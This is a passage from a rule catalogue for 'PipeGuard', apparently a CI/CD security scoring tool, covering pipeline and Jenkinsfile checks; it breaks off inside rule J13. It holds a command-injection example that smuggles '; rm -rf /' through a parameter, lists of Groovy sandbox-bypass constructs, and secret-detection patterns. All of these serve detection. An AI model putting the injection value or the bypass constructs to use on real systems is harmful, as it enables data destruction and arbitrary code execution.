# PipeGuard — 145 Security & Quality Rules

---

## Scoring System

- **Total: 100 points** across 6 categories
- Each rule has **points** (1-4) and **severity** (CRITICAL / HIGH / MEDIUM / LOW)
- Maturity Level = f(total score)

```
Category          Max Points    Rules
──────────────────────────────────────────
SEC  Secrets         15         R01–R07
SAS  SAST            15         R08–R14
SCA  Supply Chain    20         R15–R23
DST  DAST            10         R24–R27
DEP  Deployment      20         R28–R36
GOV  Governance      20         R37–R45
JEN  Jenkinsfile    100         J01–J30
DOC  Dockerfile     100         D01–D40
PQL  Quality        100         Q01–Q35
──────────────────────────────────────────
TOTAL (Pipeline)   100 sec + 100 quality  ← .gitlab-ci.yml / GitHub Actions
TOTAL (Jenkins)    100         30 rules   ← Jenkinsfile
TOTAL (Dockerfile) 100         40 rules   ← Dockerfile
TOTAL (Quality)    100         35 rules   ← ALL pipeline types
```

---

## Maturity Levels

| Level | Name | Score | Description |
|-------|------|-------|-------------|
| 0 | No Security | 0–19 | Pipeline has zero or near-zero security stages |
| 1 | Minimal | 20–39 | Some tools present but not blocking |
| 2 | Basic | 40–59 | Security stages exist, some block, major gaps remain |
| 3 | Intermediate | 60–79 | Solid pipeline with minor improvements needed |
| 4 | Advanced | 80–94 | Defense in depth, centralized tracking, strong governance |
| 5 | Elite DevSecOps | 95–100 | Full maturity, audit-ready, automated compliance |

---

---

# SEC — Secret Management (15 pts)

> Source: Stage 1 (GitLeaks + TruffleHog) 

---

### R01 — Secret scanning tool present
```
ID:          R01
Category:    SEC
Severity:    CRITICAL
Points:      3
Description: Pipeline must include a secret scanning stage using GitLeaks, TruffleHog, or equivalent.
Why:         Leaked credentials = #1 cause of breaches. Uber (2016): AWS key in repo → 57M users exposed.
What:        Check for stage/job containing: gitleaks, trufflehog, detect-secrets, git-secrets
Fix:         Add a secret scanning job in the earliest stage of the pipeline.
```

### R02 — Secret scan blocks pipeline
```
ID:          R02
Category:    SEC
Severity:    CRITICAL
Points:      2
Description: Secret scanning job must NOT have allow_failure: true. If secrets found = pipeline STOP.
Why:         allow_failure: true means secrets are detected but nobody cares. Useless.
What:        Check secret scan job does NOT have allow_failure: true
Fix:         Set allow_failure: false on secret scanning jobs.
```

### R03 — Git history scanning enabled
```
ID:          R03
Category:    SEC
Severity:    HIGH
Points:      2
Description: Secret scanner must scan git history, not just current commit. Developer deletes password but it stays in git log.
Why:         TruffleHog found AWS key in 2-month-old commit that was "deleted" from code. Still valid. Still dangerous.
What:        Check for: --since-commit, trufflehog git, --scan-history, --all-history
Fix:         Use trufflehog with git history mode or gitleaks with --log-opts.
```

### R04 — Pre-commit hook configured
```
ID:          R04
Category:    SEC
Severity:    MEDIUM
Points:      2
Description: Pipeline references or enforces pre-commit hooks for secret detection (shift-left to dev machine).
Why:         Better to catch secret before it enters git history than after.
What:        Check for: pre-commit, husky, lefthook references with secret scanning
Fix:         Add pre-commit configuration with gitleaks hook.
```

### R05 — Multiple secret scanners (defense in depth)
```
ID:          R05
Category:    SEC
Severity:    MEDIUM
Points:      2
Description: Pipeline uses 2+ secret scanning tools (e.g., GitLeaks + TruffleHog).
Why:         GitLeaks uses regex patterns. TruffleHog verifies secrets live. Different detection methods catch different things.
What:        Count distinct secret scanning tools >= 2
Fix:         Add TruffleHog alongside GitLeaks for verified secret detection.
```

### R06 — No hardcoded secrets in pipeline config
```
ID:          R06
Category:    SEC
Severity:    CRITICAL
Points:      2
Description: Pipeline config itself must not contain hardcoded passwords, tokens, or keys.
Why:         Pipeline YAML is code. If pushed to repo, secrets are exposed in plain text.
What:        Scan pipeline YAML for patterns: password=, token=, secret=, api_key=, AWS_SECRET
Fix:         Use CI/CD variables, Vault integration, or masked variables instead.
```

### R07 — Secrets injected from secure source
```
ID:          R07
Category:    SEC
Severity:    HIGH
Points:      2
Description: Pipeline uses Vault, CI/CD masked variables, or external secret manager — not environment inline.
Why:         Inline env vars in YAML are visible to anyone with repo access.
What:        Check for: vault, hashicorp, $CI_VARIABLE, secrets:, aws-secrets-manager
Fix:         Integrate HashiCorp Vault or use CI/CD platform's secret management.
```

---

# SAS — Static Analysis / SAST (15 pts)

> Source: Stage 2 (Semgrep + njsscan + gosec + Bandit) — 

---

### R08 — SAST tool present in pipeline
```
ID:          R08
Category:    SAS
Severity:    CRITICAL
Points:      3
Description: Pipeline must include at least one SAST tool (Semgrep, SonarQube, njsscan, gosec, Bandit, CodeQL, ESLint security).
Why:         Without SAST: SQL Injection, XSS, RCE bugs reach production. OWASP Top 10 undetected.
What:        Check for: semgrep, sonarqube, sonar-scanner, codeql, bandit, gosec, njsscan, eslint, brakeman, checkmarx
Fix:         Add Semgrep as a universal SAST scanner (supports 30+ languages).
```

### R09 — SAST blocks pipeline on critical findings
```
ID:          R09
Category:    SAS
Severity:    HIGH
Points:      2
Description: SAST job must block pipeline when critical/high severity findings are detected.
Why:         200+ findings with allow_failure: true = nobody reads them = useless. Learned this the hard way.
What:        Check SAST job does NOT have allow_failure: true, OR has severity threshold exit code
Fix:         Set allow_failure: false or use --error flag with severity threshold.
```

### R10 — Multi-language SAST coverage
```
ID:          R10
Category:    SAS
Severity:    MEDIUM
Points:      2
Description: SAST covers ALL languages in the project (not just one). Monorepo with Go + Node.js needs gosec + njsscan.
Why:         Semgrep alone misses language-specific bugs. njsscan catches prototype pollution, gosec catches race conditions.
What:        Check for 2+ SAST tools OR Semgrep/CodeQL (multi-language)
Fix:         Add language-specific scanners alongside Semgrep: gosec for Go, Bandit for Python, njsscan for Node.js.
```

### R11 — SAST configured with custom rules or OWASP ruleset
```
ID:          R11
Category:    SAS
Severity:    LOW
Points:      1
Description: SAST scanner uses custom rules or explicit OWASP Top 10 ruleset, not just defaults.
Why:         Default rules have too many false positives. Custom rules reduce noise, increase developer trust.
What:        Check for: --config, -c, rules/, .semgrep.yml, sonar.properties, custom profile
Fix:         Create a custom Semgrep config or SonarQube quality profile tailored to your project.
```

### R12 — SAST results uploaded to centralized tracker
```
ID:          R12
Category:    SAS
Severity:    MEDIUM
Points:      2
Description: SAST results are exported (JSON/SARIF) and uploaded to DefectDojo or similar centralized platform.
Why:         Reports scattered across pipeline logs = no tracking, no trending, no audit.
What:        Check for: defectdojo, --output, --sarif, -o json, upload, import-scan
Fix:         Export SAST results as SARIF and upload to DefectDojo via API.
```

### R13 — False positive management configured
```
ID:          R13
Category:    SAS
Severity:    LOW
Points:      1
Description: SAST has ignore/exclude configuration for known false positives (.semgrepignore, nosec, nolint).
Why:         Without it, developers lose trust and start bypassing the tool entirely.
What:        Check for: .semgrepignore, .eslintignore, nosec, nolint:gosec, //noinspection
Fix:         Create .semgrepignore file and document false positive exclusion process.
```

### R14 — Lint / code quality check present
```
ID:          R14
Category:    SAS
Severity:    LOW
Points:      2
Description: Pipeline includes linter or code quality check (ESLint, golangci-lint, pylint, go vet).
Why:         Linters catch bugs SAST misses: unreachable code, shadowed variables, format string bugs.
What:        Check for: eslint, golangci-lint, pylint, flake8, go vet, rubocop
Fix:         Add golangci-lint for Go, ESLint for JavaScript, pylint/flake8 for Python.
```

---

# SCA — Supply Chain Security (20 pts)

> Source: Stages 3, 6, 7, 8 (SCA + Container Scan + SBOM + Cosign) — ATTACKS.md Categories 3 & 4

---

### R15 — Dependency scanning (SCA) present
```
ID:          R15
Category:    SCA
Severity:    CRITICAL
Points:      3
Description: Pipeline scans dependencies for known CVEs (npm audit, govulncheck, pip-audit, Snyk, Dependabot).
Why:         Your code is clean but lodash has CVE-2024-XXXX → prototype pollution → bypass auth.
What:        Check for: npm audit, govulncheck, pip-audit, snyk, dependency-check, trivy fs, grype dir
Fix:         Add npm audit / govulncheck / pip-audit for your language ecosystem.
```

### R16 — Container image scanning present
```
ID:          R16
Category:    SCA
Severity:    CRITICAL
Points:      3
Description: Pipeline scans Docker images for OS and library vulnerabilities (Trivy, Grype, Snyk Container).
Why:         node:18 base image has CVE in OpenSSL → container escape → host compromised.
What:        Check for: trivy image, grype, snyk container, clair, docker scan
Fix:         Add Trivy image scanning after Docker build.
```

### R17 — 2+ container scanners (defense in depth)
```
ID:          R17
Category:    SCA
Severity:    HIGH
Points:      2
Description: Pipeline uses 2+ container scanners. Trivy + Grype have different databases → catch different CVEs.
Why:         Trivy said 3 CRITICAL, Grype said 1 CRITICAL. Different databases = different detection. Union is safest.
What:        Count distinct container scanners >= 2
Fix:         Add Grype alongside Trivy. Use union of findings for quality gate.
```

### R18 — Container scan blocks on CRITICAL/HIGH
```
ID:          R18
Category:    SCA
Severity:    HIGH
Points:      2
Description: Container scanning blocks pipeline when CRITICAL or HIGH vulnerabilities are found.
Why:         Scanning without blocking = generating reports nobody reads.
What:        Check container scan job: allow_failure: false AND/OR --exit-code 1 --severity CRITICAL,HIGH
Fix:         Add --exit-code 1 --severity CRITICAL,HIGH to Trivy or equivalent severity gate.
```

### R19 — Image signing (Cosign) before deployment
```
ID:          R19
Category:    SCA
Severity:    HIGH
Points:      2
Description: Pipeline signs container images with Cosign (or Notation) after build and before deployment.
Why:         Without signing: attacker modifies image in registry → malware deployed to production. Man-in-the-middle.
What:        Check for: cosign sign, cosign verify, notation sign, docker trust sign
Fix:         Add Cosign sign step after container scan, and verify step before deployment.
```

### R20 — SBOM generation
```
ID:          R20
Category:    SCA
Severity:    HIGH
Points:      2
Description: Pipeline generates Software Bill of Materials (SBOM) in CycloneDX or SPDX format.
Why:         Log4Shell hits → you need to know in 5 minutes: "do I have log4j in ANY of my images?" Without SBOM = panic.
What:        Check for: syft, cyclonedx, spdx, sbom, bom, trivy sbom
Fix:         Add Syft to generate CycloneDX SBOM after Docker build.
```

### R21 — Private container registry used
```
ID:          R21
Category:    SCA
Severity:    MEDIUM
Points:      2
Description: Pipeline pushes images to a private registry (Harbor, ECR, GCR, ACR) — not Docker Hub public.
Why:         Docker Hub public = anyone sees your images, your layers, your app structure.
What:        Check for: harbor, ecr, gcr, acr, ghcr, private registry URLs (not docker.io without auth)
Fix:         Push images to Harbor or cloud provider's private container registry.
```

### R22 — Dependency lock files present
```
ID:          R22
Category:    SCA
Severity:    MEDIUM
Points:      2
Description: Pipeline uses lock files (package-lock.json, go.sum, Pipfile.lock) and installs from them.
Why:         Without lock files: npm install pulls latest → could be compromised version → dependency confusion attack.
What:        Check for: npm ci (not npm install), go mod verify, pip install --require-hashes, --frozen-lockfile
Fix:         Use npm ci instead of npm install. Use go mod verify. Use pip --require-hashes.
```

### R23 — Base image pinned to digest
```
ID:          R23
Category:    SCA
Severity:    LOW
Points:      2
Description: Dockerfile uses pinned base images (digest) not just tags. FROM node:18@sha256:abc...
Why:         node:18 tag can be overwritten. Digest is immutable. Prevents malicious base image swap.
What:        Check Dockerfile for: @sha256: in FROM statements
Fix:         Pin base images to SHA256 digest: FROM node:18@sha256:abc123...
```

---

# DST — Dynamic Testing / DAST (10 pts)

> Source: Stage 12 (OWASP ZAP) — ATTACKS.md Category 5

---

### R24 — DAST tool present in pipeline
```
ID:          R24
Category:    DST
Severity:    CRITICAL
Points:      3
Description: Pipeline runs DAST (ZAP, Burp, Nuclei, DAST-scanner) against a deployed environment.
Why:         SAST finds code bugs. DAST finds RUNTIME bugs: missing headers, cookie flags, CORS misconfig, information disclosure.
What:        Check for: zap, owasp-zap, zap-baseline, zap-full-scan, nuclei, dastardly, burp
Fix:         Add OWASP ZAP baseline scan against staging URL.
```

### R25 — DAST runs against staging (not just dev)
```
ID:          R25
Category:    DST
Severity:    HIGH
Points:      2
Description: DAST must target a staging/preview environment that mirrors production — not localhost.
Why:         DAST on dev misses reverse proxy configs, load balancer headers, production middleware.
What:        Check DAST target URL contains: staging, stg, preview, or is not localhost/127.0.0.1
Fix:         Point ZAP at the staging environment URL after deployment.
```

### R26 — DAST has readiness check before scan
```
ID:          R26
Category:    DST
Severity:    MEDIUM
Points:      2
Description: Pipeline waits for application readiness before starting DAST scan (health check loop).
Why:         ZAP crashes randomly when hitting a dead endpoint. Learned this the hard way — flaky pipeline for weeks.
What:        Check for: curl.*health, wait, readiness, until.*curl, sleep.*retry before DAST job
Fix:         Add readiness check: until curl -sf $URL/health; do sleep 5; done before ZAP scan.
```

### R27 — DAST results exported
```
ID:          R27
Category:    DST
Severity:    LOW
Points:      3
Description: DAST results are exported as JSON/XML/SARIF and stored as artifacts or uploaded to tracker.
Why:         DAST run without storing results = no audit trail, no trending, no proof for compliance.
What:        Check for: -J, --json, -r report, artifacts:, -x report.xml in DAST configuration
Fix:         Add -J flag to ZAP for JSON report and save as pipeline artifact.
```

---

# DEP — Deployment Security (20 pts)

> Source: Stages 9-11, 15-20 (Deploy, Smoke, Promote, Rollback) — ATTACKS.md Category 6

---

### R28 — Manual approval gate before production
```
ID:          R28
Category:    DEP
Severity:    CRITICAL
Points:      3
Description: Production deployment requires manual approval (when: manual, environment: production with required_reviewers).
Why:         Without manual gate: any developer pushes to main → auto-deploy to production → no human review.
What:        Check for: when: manual, required_reviewers, approval, environment.*production with protection
Fix:         Add when: manual on production deploy job, or use environment protection rules.
```

### R29 — Rollback stage present
```
ID:          R29
Category:    DEP
Severity:    CRITICAL
Points:      3
Description: Pipeline includes a rollback mechanism (manual trigger, ArgoCD rollback, previous image redeploy).
Why:         Bug in prod + no rollback = downtime until hotfix. Rollback = instant recovery.
What:        Check for: rollback, revert, undo, previous_image, argocd.*rollback
Fix:         Add a manual rollback job that redeploys the previous known-good image.
```

### R30 — Smoke test after deployment
```
ID:          R30
Category:    DEP
Severity:    HIGH
Points:      2
Description: Pipeline runs smoke/health check after deployment to verify the app is alive and responding.
Why:         App deployed but crashed on startup → 502 Bad Gateway → nobody knows for 30 minutes.
What:        Check for: smoke, health, healthcheck, curl.*health, readiness, liveness after deploy job
Fix:         Add smoke test job: curl -sf $PROD_URL/health || exit 1 after production deploy.
```

### R31 — Same image promoted (no rebuild)
```
ID:          R31
Category:    DEP
Severity:    HIGH
Points:      2
Description: The exact same image (same tag/SHA) deployed to staging is promoted to production — no rebuild.
Why:         Rebuilding for prod means different image than what was tested. Code could change between builds.
What:        Check for: promote, image.*tag, .promote-image-tag, same SHA/digest referenced across stages
Fix:         Save image tag in artifact file and reuse it for production deployment.
```

### R32 — GitOps deployment (not kubectl direct)
```
ID:          R32
Category:    DEP
Severity:    MEDIUM
Points:      2
Description: Deployment uses GitOps (ArgoCD, Flux) — not direct kubectl apply from pipeline.
Why:         GitOps = audit trail in Git, easy rollback via git revert, single source of truth. kubectl direct = no history.
What:        Check for: argocd, flux, gitops, kustomize, git push.*deploy, helm upgrade with git
Fix:         Implement ArgoCD/Flux GitOps workflow: pipeline updates manifest repo, ArgoCD syncs.
```

### R33 — Canary or blue-green deployment
```
ID:          R33
Category:    DEP
Severity:    MEDIUM
Points:      2
Description: Pipeline supports progressive delivery: canary, blue-green, or rolling update with health checks.
Why:         Big bang deploy = all users affected if bug. Canary = 5% traffic first → validate → promote.
What:        Check for: canary, blue-green, rolling, progressive, flagger, argo-rollouts, istio
Fix:         Implement Argo Rollouts or Flagger for canary deployments.
```

### R34 — Deployment notifications
```
ID:          R34
Category:    DEP
Severity:    LOW
Points:      2
Description: Pipeline sends notifications on deployment success/failure (Slack, Teams, email, webhook).
Why:         Deployment failed at 3am → nobody knows → downtime until morning.
What:        Check for: slack, teams, webhook, notify, notification, email, discord, mattermost
Fix:         Add Slack/Teams webhook notification on deploy success and failure.
```

### R35 — Environment-specific configurations
```
ID:          R35
Category:    DEP
Severity:    MEDIUM
Points:      2
Description: Pipeline uses different configurations per environment (dev/staging/prod) — not same config everywhere.
Why:         Production debug mode ON = information disclosure. Staging secrets in prod = security hole.
What:        Check for: environment:, stages with env-specific names, variables per environment
Fix:         Use CI/CD environment scoping or Kustomize overlays per environment.
```

### R36 — Protected branches enforce pipeline
```
ID:          R36
Category:    DEP
Severity:    HIGH
Points:      2
Description: Pipeline cannot be skipped on protected branches (main, production). No git push -o ci.skip allowed.
Why:         Developer frustrated → ci.skip → untested code in production → breach.
What:        Check for: rules with protected branches, only: main/master/production without manual skip option
Fix:         Configure branch protection to require passing CI before merge.
```

---

# GOV — Governance & Compliance (20 pts)

> Source: Stages 13-14 (SonarQube + DefectDojo) + operational best practices

---

### R37 — Centralized vulnerability tracker
```
ID:          R37
Category:    GOV
Severity:    HIGH
Points:      4
Description: All scan results are uploaded to a centralized vulnerability management platform (DefectDojo, Snyk, Jira Security).
Why:         Reports in 5 different pipeline logs = no visibility. "How many critical vulns do we have?" → can't answer.
What:        Check for: defectdojo, snyk, import-scan, upload.*report, vulnerability.*management
Fix:         Deploy DefectDojo and upload all scan results via API from pipeline.
```

### R38 — Quality gate present (SonarQube or equivalent)
```
ID:          R38
Category:    GOV
Severity:    MEDIUM
Points:      2
Description: Pipeline includes a code quality gate with defined thresholds (coverage, bugs, security, duplication).
Why:         No quality gate = tech debt accumulates → project unmaintainable → security holes.
What:        Check for: sonarqube, sonar-scanner, quality gate, coverage threshold, codeclimate
Fix:         Add SonarQube with quality gate: 80% coverage on new code, 0 critical vulnerabilities.
```

### R39 — Unit tests present and required
```
ID:          R39
Category:    GOV
Severity:    HIGH
Points:      2
Description: Pipeline includes unit tests stage that must pass (jest, go test, pytest, etc.).
Why:         Broken code in staging = downtime. Tests catch regression before deployment.
What:        Check for: test, jest, go test, pytest, mocha, rspec, unittest, coverage
Fix:         Add unit test stage with coverage reporting.
```

### R40 — Pipeline stages are ordered correctly
```
ID:          R40
Category:    GOV
Severity:    MEDIUM
Points:      2
Description: Security stages run BEFORE build/deploy (shift-left). Secret scan first, then SAST, then build.
Why:         If build runs before secret scan: secret already baked into image. Too late.
What:        Check stage ordering: secret scan → SAST/SCA → build → container scan → deploy
Fix:         Reorder pipeline: security scans in earliest stages, deploy in latest.
```

### R41 — Pipeline runs on all merge requests
```
ID:          R41
Category:    GOV
Severity:    HIGH
Points:      2
Description: Pipeline is triggered on merge requests / pull requests, not just on push to main.
Why:         Code reviewed by pipeline BEFORE merge = shift left. After merge = too late.
What:        Check for: merge_requests, pull_request, on: pull_request, rules: - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
Fix:         Add merge request trigger to pipeline configuration.
```

### R42 — Scan reports stored as artifacts
```
ID:          R42
Category:    GOV
Severity:    MEDIUM
Points:      2
Description: All scan reports (JSON/SARIF/HTML) are stored as pipeline artifacts for audit trail.
Why:         Audit asks "show me scan results from 3 months ago" → if not stored = compliance failure.
What:        Check for: artifacts:, paths:, reports:, expire_in:, upload-artifact
Fix:         Add artifacts section to all scanning jobs with appropriate retention period.
```

### R43 — OWASP Top 10 coverage
```
ID:          R43
Category:    GOV
Severity:    MEDIUM
Points:      2
Description: Pipeline tools collectively cover OWASP Top 10 (Injection, Broken Auth, XSS, SSRF, etc.).
Why:         OWASP Top 10 = minimum baseline. If your pipeline doesn't cover it, it's not a security pipeline.
What:        Check: SAST (covers injection, XSS) + DAST (covers headers, CORS) + SCA (covers known vulns) + Secrets
Fix:         Ensure you have SAST + SCA + DAST + Secret scanning = covers OWASP Top 10.
```

### R44 — Compliance output format (SARIF)
```
ID:          R44
Category:    GOV
Severity:    LOW
Points:      1
Description: At least one scanner outputs SARIF format for IDE integration and standardized reporting.
Why:         SARIF = standard format. GitHub Code Scanning, VS Code, DefectDojo all understand it.
What:        Check for: sarif, --format sarif, -f sarif, SARIF
Fix:         Add --format sarif flag to Semgrep, Trivy, or CodeQL output.
```

### R45 — Pipeline timeout configured
```
ID:          R45
Category:    GOV
Severity:    LOW
Points:      1
Description: Pipeline has timeout configured to prevent infinite hangs (especially DAST/ZAP).
Why:         ZAP hangs → pipeline running for 2 hours → runner blocked → other pipelines queued.
What:        Check for: timeout, time_limit, -m (ZAP timeout), deadline, max-time
Fix:         Set job-level timeout: timeout: 30 minutes for scanning jobs, 5 minutes for ZAP.
```

---

---

# Summary Table — All 45 Rules

```
┌──────┬─────┬──────────┬─────────────────────────────────────────────────────┬──────┬────────┐
│ RULE │ CAT │ SEVERITY │ CHECK                                               │ PTS  │ TOTAL  │
├──────┼─────┼──────────┼─────────────────────────────────────────────────────┼──────┼────────┤
│ R01  │ SEC │ CRITICAL │ Secret scanning tool present                        │  3   │        │
│ R02  │ SEC │ CRITICAL │ Secret scan blocks pipeline (allow_failure: false)   │  2   │        │
│ R03  │ SEC │ HIGH     │ Git history scanning enabled                        │  2   │        │
│ R04  │ SEC │ MEDIUM   │ Pre-commit hook for secrets                         │  2   │        │
│ R05  │ SEC │ MEDIUM   │ 2+ secret scanners (defense in depth)               │  2   │        │
│ R06  │ SEC │ CRITICAL │ No hardcoded secrets in pipeline config              │  2   │        │
│ R07  │ SEC │ HIGH     │ Secrets from secure source (Vault/masked vars)       │  2   │  = 15  │
├──────┼─────┼──────────┼─────────────────────────────────────────────────────┼──────┼────────┤
│ R08  │ SAS │ CRITICAL │ SAST tool present                                   │  3   │        │
│ R09  │ SAS │ HIGH     │ SAST blocks on critical findings                    │  2   │        │
│ R10  │ SAS │ MEDIUM   │ Multi-language SAST coverage                        │  2   │        │
│ R11  │ SAS │ LOW      │ Custom rules / OWASP ruleset configured             │  1   │        │
│ R12  │ SAS │ MEDIUM   │ SAST results uploaded to tracker                    │  2   │        │
│ R13  │ SAS │ LOW      │ False positive management (.semgrepignore)           │  1   │        │
│ R14  │ SAS │ LOW      │ Lint / code quality check present                   │  2   │  = 13  │
├──────┼─────┼──────────┼─────────────────────────────────────────────────────┼──────┼────────┤
│ R15  │ SCA │ CRITICAL │ Dependency scanning (SCA) present                   │  3   │        │
│ R16  │ SCA │ CRITICAL │ Container image scanning present                    │  3   │        │
│ R17  │ SCA │ HIGH     │ 2+ container scanners                               │  2   │        │
│ R18  │ SCA │ HIGH     │ Container scan blocks on CRITICAL/HIGH              │  2   │        │
│ R19  │ SCA │ HIGH     │ Image signing (Cosign)                              │  2   │        │
│ R20  │ SCA │ HIGH     │ SBOM generation (CycloneDX/SPDX)                    │  2   │        │
│ R21  │ SCA │ MEDIUM   │ Private container registry                          │  2   │        │
│ R22  │ SCA │ MEDIUM   │ Dependency lock files used                          │  2   │        │
│ R23  │ SCA │ LOW      │ Base image pinned to digest                         │  2   │  = 20  │
├──────┼─────┼──────────┼─────────────────────────────────────────────────────┼──────┼────────┤
│ R24  │ DST │ CRITICAL │ DAST tool present                                   │  3   │        │
│ R25  │ DST │ HIGH     │ DAST targets staging (not localhost)                 │  2   │        │
│ R26  │ DST │ MEDIUM   │ DAST readiness check before scan                    │  2   │        │
│ R27  │ DST │ LOW      │ DAST results exported                               │  3   │  = 10  │
├──────┼─────┼──────────┼─────────────────────────────────────────────────────┼──────┼────────┤
│ R28  │ DEP │ CRITICAL │ Manual approval before production                   │  3   │        │
│ R29  │ DEP │ CRITICAL │ Rollback stage present                              │  3   │        │
│ R30  │ DEP │ HIGH     │ Smoke test after deployment                         │  2   │        │
│ R31  │ DEP │ HIGH     │ Same image promoted (no rebuild)                    │  2   │        │
│ R32  │ DEP │ MEDIUM   │ GitOps deployment (ArgoCD/Flux)                     │  2   │        │
│ R33  │ DEP │ MEDIUM   │ Canary / blue-green deployment                      │  2   │        │
│ R34  │ DEP │ LOW      │ Deployment notifications (Slack/Teams)              │  2   │        │
│ R35  │ DEP │ MEDIUM   │ Environment-specific configurations                 │  2   │        │
│ R36  │ DEP │ HIGH     │ Protected branches enforce pipeline                 │  2   │  = 20  │
├──────┼─────┼──────────┼─────────────────────────────────────────────────────┼──────┼────────┤
│ R37  │ GOV │ HIGH     │ Centralized vulnerability tracker (DefectDojo)      │  4   │        │
│ R38  │ GOV │ MEDIUM   │ Quality gate (SonarQube)                            │  2   │        │
│ R39  │ GOV │ HIGH     │ Unit tests present and required                     │  2   │        │
│ R40  │ GOV │ MEDIUM   │ Pipeline stages ordered correctly (shift-left)      │  2   │        │
│ R41  │ GOV │ HIGH     │ Pipeline runs on merge requests                     │  2   │        │
│ R42  │ GOV │ MEDIUM   │ Scan reports stored as artifacts                    │  2   │        │
│ R43  │ GOV │ MEDIUM   │ OWASP Top 10 coverage                              │  2   │        │
│ R44  │ GOV │ LOW      │ SARIF output format                                 │  1   │        │
│ R45  │ GOV │ LOW      │ Pipeline timeout configured                         │  1   │  = 18  │
├──────┼─────┼──────────┼─────────────────────────────────────────────────────┼──────┼────────┤
│      │     │          │                                          GRAND TOTAL │      │ = 96*  │
└──────┴─────┴──────────┴─────────────────────────────────────────────────────┴──────┴────────┘

* Note: SAS=13 + GOV=18 instead of 15+20 = leaves 4 bonus points for exceptional practices.
  Adjust individual point values in Go implementation to hit exactly 100.
```

---

---

# JEN — Jenkinsfile Security Rules (100 pts)

> Jenkinsfile = Groovy code. :).

---

### J01 — Pipeline defined as code (Jenkinsfile in repo)
```
ID:          J01
Category:    JEN
Severity:    CRITICAL
Points:      5
Description: Pipeline must be defined as Jenkinsfile in the repo, not configured via Jenkins UI.
Why:         UI-configured jobs = no version control, no audit trail, no review. Anyone with Jenkins access can change pipeline.
What:        Check: Jenkinsfile exists in repo root or configured path
Fix:         Move all pipeline logic to a Jenkinsfile committed in the repository.
```

### J02 — No plaintext credentials in Jenkinsfile
```
ID:          J02
Category:    JEN
Severity:    CRITICAL
Points:      5
Description: Jenkinsfile must NOT contain hardcoded passwords, tokens, or API keys in plain text.
Why:         Jenkinsfile is code in repo. Plaintext secret = leaked to everyone with repo access.
What:        Scan for: password, secret, token, apiKey, api_key, AWS_SECRET, PRIVATE_KEY as string literals
Fix:         Use credentials() binding or withCredentials block from Jenkins Credentials Plugin.
```

### J03 — Credentials used via withCredentials block
```
ID:          J03
Category:    JEN
Severity:    CRITICAL
Points:      4
Description: Secrets must be injected via withCredentials {} or credentials() — never as plain environment variables.
Why:         withCredentials masks values in logs, limits scope to block. Plain env = visible in console output.
What:        Check for: withCredentials, credentials(), usernamePassword, sshUserPrivateKey, string(credentialsId:)
Fix:         Wrap secret usage in: withCredentials([string(credentialsId: 'my-token', variable: 'TOKEN')]) { ... }
```

### J04 — No script approval bypasses
```
ID:          J04
Category:    JEN
Severity:    CRITICAL
Points:      4
Description: Jenkinsfile must NOT use @Grab, evaluate(), or methods that bypass script security sandbox.
Why:         @Grab downloads arbitrary JARs at runtime = Remote Code Execution. evaluate() = arbitrary Groovy execution.
What:        Check for: @Grab, @GrabResolver, evaluate(, Eval.me, GroovyShell, new File(
Fix:         Remove @Grab annotations. Use approved Jenkins plugins instead of raw Groovy scripting.
```

### J05 — No use of sh with user-controlled input
```
ID:          J05
Category:    JEN
Severity:    CRITICAL
Points:      4
Description: sh/bat steps must NOT interpolate user-controlled parameters directly (command injection risk).
Why:         sh "echo ${params.USER_INPUT}" → user sends ; rm -rf / → entire Jenkins agent wiped.
What:        Check for: sh "...${params., sh "...${env. with user-controllable vars without sanitization
Fix:         Use sh(script: '...', returnStdout: true) with single quotes, or sanitize input explicitly.
```

### J06 — Agent/node label specified (not any)
```
ID:          J06
Category:    JEN
Severity:    HIGH
Points:      3
Description: Pipeline must specify agent label — not agent any. agent any = runs on ANY node including controller.
Why:         Running on controller = access to Jenkins secrets, config files, all credentials. Massive attack surface.
What:        Check for: agent any (bad) vs agent { label 'worker' } or agent { docker } (good)
Fix:         Use agent { label 'ci-worker' } or agent { docker { image 'node:18' } } — never agent any.
```

### J07 — No builds on Jenkins controller
```
ID:          J07
Category:    JEN
Severity:    HIGH
Points:      3
Description: Pipeline must NOT execute on the Jenkins controller (master) node. Only on agents/workers.
Why:         Controller has access to ALL credentials, ALL jobs, ALL configurations. Compromised build = game over.
What:        Check for: agent { label 'master' }, agent { label 'built-in' }, node('master')
Fix:         Use dedicated worker nodes. Set controller executors to 0 in Jenkins configuration.
```

### J08 — Timeout configured on pipeline or stages
```
ID:          J08
Category:    JEN
Severity:    MEDIUM
Points:      2
Description: Pipeline or stages have timeout configured to prevent infinite hangs.
Why:         Hung build = agent blocked forever = other builds queued = CI/CD paralyzed.
What:        Check for: timeout(time:, options { timeout(, timestamps()
Fix:         Add options { timeout(time: 30, unit: 'MINUTES') } at pipeline or stage level.
```

### J09 — Shared libraries pinned to version
```
ID:          J09
Category:    JEN
Severity:    HIGH
Points:      3
Description: @Library annotations must pin to a specific version/tag — not @Library('my-lib') with implicit latest.
Why:         Unpinned library = anyone with write access to library repo can inject malicious code into ALL pipelines.
What:        Check for: @Library('name') without @version, @Library('name@main') → should be @Library('name@v1.2.3')
Fix:         Pin library: @Library('my-shared-lib@v2.1.0') — use semantic version tag, not branch.
```

### J10 — Retry and error handling present
```
ID:          J10
Category:    JEN
Severity:    LOW
Points:      2
Description: Pipeline has retry {} or catchError {} blocks for flaky stages (especially DAST, deployments).
Why:         Network glitch → scan fails → pipeline fails → developer re-triggers manually → wasted time.
What:        Check for: retry(, catchError(, try/catch, post { failure }, post { always }
Fix:         Add retry(2) { ... } around external tool calls. Add post { failure { notify } } block.
```

### J11 — No checkout scm on untrusted branches
```
ID:          J11
Category:    JEN
Severity:    HIGH
Points:      3
Description: Multibranch pipelines should NOT auto-build PRs from forks without approval.
Why:         Attacker forks repo → adds malicious Jenkinsfile → PR triggers pipeline → RCE on your Jenkins agent.
What:        Check for: Trust strategy configuration, buildForkPRs, untrusted branch execution
Fix:         Set "Trust" to "Nobody" for fork PRs. Require admin approval before building fork PRs.
```

### J12 — Post-build cleanup configured
```
ID:          J12
Category:    JEN
Severity:    MEDIUM
Points:      2
Description: Pipeline has post { always { cleanWs() } } or workspace cleanup to remove sensitive artifacts.
Why:         Workspace persists between builds. Secret files, scan results, tokens left on disk = leaked.
What:        Check for: cleanWs(), deleteDir(), post { always { cleanup, workspace cleanup
Fix:         Add post { always { cleanWs() } } to pipeline or stage level.
```

### J13 — Docker agent with pinned image
```
ID:          J13
Category:    JEN
Severity:    MEDIUM
Points:      3
